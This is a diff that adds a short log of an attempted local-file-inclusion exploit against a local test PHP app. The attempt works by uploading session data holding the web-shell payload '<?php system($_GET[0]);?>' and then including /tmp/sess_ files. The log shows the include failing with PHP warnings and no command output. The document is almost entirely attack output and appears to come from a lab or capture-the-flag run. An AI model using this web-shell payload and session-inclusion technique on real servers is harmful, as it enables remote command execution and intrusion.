@@ -1,0 +1,11 @@
+[*] upload http://127.0.0.1:8090/index.php sid=lfi3df9e35fe4b4e7683585b9fc
+[*] payload=<?php system($_GET[0]);?>
+[*] upload status=200 body=b''
+[*] include /tmp/sess_lfi3df9e35fe4b4e7683585b9fc
+[*] lfi status=200 bytes=349
+<br />
+<b>Warning</b>:  include(/tmp/sess_lfi3df9e35fe4b4e7683585b9fc): Failed to open stream: No such file or directory in <b>/web-lfi/index.php</b> on line <b>4</b><br />
+<br />
+<b>Warning</b>:  include(): Failed opening '/tmp/sess_lfi3df9e35fe4b4e7683585b9fc' for inclusion (include_path='.:') in <b>/web-lfi/index.php</b> on line <b>4</b><br />
+
+[*] command output present: False
